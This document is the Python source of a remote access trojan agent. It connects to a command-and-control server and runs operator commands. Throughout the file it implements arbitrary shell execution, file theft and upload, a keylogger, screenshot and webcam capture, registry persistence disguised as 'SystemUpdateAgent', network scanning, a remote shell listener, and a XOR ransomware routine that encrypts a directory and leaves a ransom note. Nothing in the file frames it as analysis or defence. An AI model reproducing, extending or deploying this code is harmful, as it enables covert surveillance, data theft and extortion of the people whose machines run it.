# agent.py
import socket
import json
import os
import subprocess
import platform
import struct
import time
import psutil
from PIL import ImageGrab
import threading
import sys
try:
    import pynput
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
if platform.system() == "Windows":
    import winreg

# --- Configuration ---
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8888
SLEEP_INTERVAL = 5  # Set to 0 for persistent connection
REVERSE_SHELL_PORT = 5555

# --- Keylogger Globals ---
KEY_BUFFER = []
KEYLOGGER_RUNNING = False

def send_data(sock, data):
    json_data = json.dumps(data).encode('utf-8')
    data_len = len(json_data)
    sock.sendall(struct.pack('!I', data_len))
    sock.sendall(json_data)

def recv_data(sock):
    header = sock.recv(4)
    if not header:
        return None
    data_len = struct.unpack('!I', header)[0]
    received_data = b""
    while len(received_data) < data_len:
        chunk = sock.recv(data_len - len(received_data))
        if not chunk:
            return None
        received_data += chunk
    return received_data.decode('utf-8')

# --- Keylogger ---
def on_press(key):
    global KEY_BUFFER
    try:
        KEY_BUFFER.append(key.char)
    except AttributeError:
        KEY_BUFFER.append(f" [{str(key)}] ")
    
    if len(KEY_BUFFER) >= 100: 
        pass

def start_keylogger():
    global KEYLOGGER_RUNNING
    if not PYNPUT_AVAILABLE or KEYLOGGER_RUNNING:
        return "Keylogger not available or already running."
    
    KEYLOGGER_RUNNING = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return "Keylogger started."

def get_keylogs():
    global KEY_BUFFER
    logs = "".join(KEY_BUFFER)
    KEY_BUFFER.clear()
    return logs

# --- Webcam Snapshot ---
def get_webcam_snapshot():
    if not CV2_AVAILABLE:
        return "Error: OpenCV not available on the agent."
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return "Error: Webcam not found or is being used by another application."
        ret, frame = cam.read()
        if not ret:
            return "Error: Could not read from webcam."
        temp_path = os.path.join("C:\\" if os.name == 'nt' else "/tmp", "webcam_temp.jpg")
        cv2.imwrite(temp_path, frame)
        with open(temp_path, "rb") as f:
            img_data = f.read()
        os.remove(temp_path)
        cam.release()
        return img_data.hex()
    except Exception as e:
        return f"Error accessing webcam: {e}"

# --- Persistence ---
def add_to_startup():
    if platform.system() == "Windows":
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "SystemUpdateAgent"
            python_exe = sys.executable
            script_path = os.path.abspath(__file__)
            value_data = f'"{python_exe}" "{script_path}"'
            
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
            winreg.CloseKey(key)
            return "Persistence added to Windows registry."
        except Exception as e:
            return f"Error adding persistence: {e}"
    else:
        return "Persistence for Linux/macOS not implemented in this version."

# ---  Internal Port Scanner ---
def scan_network(ip_range, ports):
    open_ports_result = {}
    for ip in ip_range:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                if ip not in open_ports_result:
                    open_ports_result[ip] = []
                open_ports_result[ip].append(port)
            sock.close()
    return open_ports_result

# --- Reverse Shell ---
def start_reverse_shell():
    def shell_handler(client_conn):
        try:
            shell = subprocess.Popen(
                ["cmd.exe" if platform.system() == "Windows" else "/bin/bash"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            while True:
                command = recv_data(client_conn)
                if not command or command.lower() == "exit":
                    break
                
                shell.stdin.write(command + "\n")
                shell.stdin.flush()
                
                # Read output and error
                stdout, stderr = shell.communicate(input=command + "\n", timeout=2)
                
                response = {"output": stdout, "error": stderr}
                send_data(client_conn, response)
        except Exception as e:
            print(f"[-] Reverse shell error: {e}")
        finally:
            client_conn.close()

    try:
        rev_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rev_server.bind(("0.0.0.0", REVERSE_SHELL_PORT))
        rev_server.listen(1)
        print(f"[+] Reverse shell listening on port {REVERSE_SHELL_PORT}")
        client_conn, addr = rev_server.accept()
        print(f"[+] Reverse shell connection from {addr}")
        shell_handler(client_conn)
    except Exception as e:
        print(f"[-] Failed to start reverse shell: {e}")

# --- Main Agent Logic ---
def get_system_info():
    info = {"OS": platform.system(), "OS Release": platform.release(), "Hostname": platform.node(), "Current User": os.getenv('USER') or os.getenv('USERNAME')}
    try:
        info["CPU Cores"] = psutil.cpu_count(logical=False)
        info["Total RAM (GB)"] = round(psutil.virtual_memory().total / (1024**3), 2)
    except Exception: pass
    return info

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        temp_path = os.path.join("C:\\" if os.name == 'nt' else "/tmp", "screenshot_temp.png")
        screenshot.save(temp_path, "PNG")
        with open(temp_path, "rb") as f:
            img_data = f.read()
        os.remove(temp_path)
        return img_data.hex()
    except Exception as e:
        return f"Error capturing screenshot: {e}"

def encrypt_files_in_dir(dir_path, key, email):
    key_bytes = key.encode()
    note_content = f"Your files have been encrypted!\nTo restore them, contact this email:\n{email}"
    for filename in os.listdir(dir_path):
        full_path = os.path.join(dir_path, filename)
        if os.path.isfile(full_path):
            try:
                with open(full_path, 'rb') as f: data = f.read()
                encrypted_data = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
                with open(full_path, 'wb') as f: f.write(encrypted_data)
            except Exception as e: print(f"[-] Error encrypting file {filename}: {e}")
    note_path = os.path.join(dir_path, "README_FOR_DECRYPT.txt")
    with open(note_path, "w", encoding="utf-8") as f: f.write(note_content)

def connect_to_server():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((SERVER_HOST, SERVER_PORT))
        print(f"[+] Connected to C2 server at {SERVER_HOST}:{SERVER_PORT}")

        initial_info = {"status": "info", "data": get_system_info()}
        send_data(client, initial_info)

        while True:
            command_data = recv_data(client)
            if not command_data: break
            
            command = json.loads(command_data)
            response = execute_command(command)
            send_data(client, response)
            
            if SLEEP_INTERVAL > 0:
                time.sleep(SLEEP_INTERVAL)

    except Exception as e:
        print(f"[-] Error connecting to server: {e}")
    finally:
        client.close()

def execute_command(command):
    cmd_type = command.get("type")
    response = {"status": "error", "message": "Invalid command."}

    if cmd_type == "list_dir":
        path = command.get("path", ".")
        try: response = {"status": "success", "data": os.listdir(path)}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "execute_shell":
        shell_command = command.get("command")
        try:
            if platform.system() == "Windows":
                result = subprocess.run(shell_command, shell=True, capture_output=True, text=True, encoding='cp850')
            else:
                result = subprocess.run(shell_command, shell=True, capture_output=True, text=True)
            response = {"status": "success", "data": result.stdout + result.stderr}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "download_file":
        path = command.get("path")
        try:
            with open(path, "rb") as f: file_data = f.read()
            filename = os.path.basename(path)
            response = {"status": "success", "data": file_data.hex(), "command_type": "download_file", "filename": filename}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "upload_file":
        path = command.get("path")
        file_data_hex = command.get("data")
        try:
            chunk_size = 8192
            with open(path, "wb") as f:
                for i in range(0, len(file_data_hex), chunk_size):
                    hex_chunk = file_data_hex[i:i+chunk_size]
                    byte_chunk = bytes.fromhex(hex_chunk)
                    f.write(byte_chunk)
            response = {"status": "success", "message": "File uploaded successfully."}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "delete_file":
        path = command.get("path")
        try:
            os.remove(path)
            response = {"status": "success", "message": f"File '{path}' deleted."}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "list_users":
        try:
            if platform.system() == "Windows":
                result = subprocess.run("query user", shell=True, capture_output=True, text=True, encoding='cp850')
            else:
                result = subprocess.run("cut -d: -f1 /etc/passwd", shell=True, capture_output=True, text=True)
            response = {"status": "success", "data": result.stdout.strip().splitlines()}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "list_software":
        try:
            if platform.system() == "Windows":
                result = subprocess.run("wmic product get name", shell=True, capture_output=True, text=True, encoding='cp850')
            else:
                result = subprocess.run("dpkg -l", shell=True, capture_output=True, text=True)
            response = {"status": "success", "data": result.stdout.strip().splitlines()}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "encrypt_dir":
        path = command.get("path")
        key = command.get("key")
        email = command.get("email")
        try:
            encrypt_files_in_dir(path, key, email)
            response = {"status": "success", "message": f"Files in directory '{path}' have been encrypted."}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "get_system_info":
        response = {"status": "success", "data": get_system_info()}
    elif cmd_type == "get_screenshot":
        img_hex = get_screenshot()
        if "Error" in img_hex:
            response = {"status": "error", "message": img_hex}
        else:
            response = {"status": "success", "data": img_hex, "command_type": "screenshot"}
    elif cmd_type == "search_files":
        root = command.get("root", "C:\\" if os.name == 'nt' else "/")
        ext = command.get("extension", ".txt")
        found_files = []
        try:
            for dirpath, _, filenames in os.walk(root):
                for filename in filenames:
                    if filename.endswith(ext):
                        found_files.append(os.path.join(dirpath, filename))
        except Exception as e:
            found_files = [f"Error during search: {e}"]
        response = {"status": "success", "data": found_files}
    elif cmd_type == "list_processes":
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
            response = {"status": "success", "data": processes}
        except Exception as e: response = {"status": "error", "message": str(e)}
    elif cmd_type == "kill_process":
        pid = command.get("pid")
        try:
            psutil.Process(int(pid)).kill()
            response = {"status": "success", "message": f"Process with PID {pid} killed."}
        except Exception as e: response = {"status": "error", "message": str(e)}
    
    # --- NEW COMMANDS ---
    elif cmd_type == "start_keylogger":
        response = {"status": "success", "message": start_keylogger()}
    elif cmd_type == "get_keylogs":
        response = {"status": "success", "data": get_keylogs()}
    elif cmd_type == "get_webcam_snapshot":
        img_hex = get_webcam_snapshot()
        if "Error" in img_hex:
            response = {"status": "error", "message": img_hex}
        else:
            response = {"status": "success", "data": img_hex, "command_type": "webcam_snapshot"}
    elif cmd_type == "add_persistence":
        response = {"status": "success", "message": add_to_startup()}
    elif cmd_type == "scan_network":
        base_ip = command.get("base_ip", "192.168.1")
        ports_to_scan = command.get("ports", [22, 80, 443, 3389, 5432])
        ip_range = [f"{base_ip}.{i}" for i in range(1, 255)]
        response = {"status": "success", "data": scan_network(ip_range, ports_to_scan)}
    elif cmd_type == "start_reverse_shell":
        threading.Thread(target=start_reverse_shell, daemon=True).start()
        response = {"status": "success", "message": f"Reverse shell initiated on port {REVERSE_SHELL_PORT}."}

    return response

if __name__ == "__main__":
    connect_to_server()
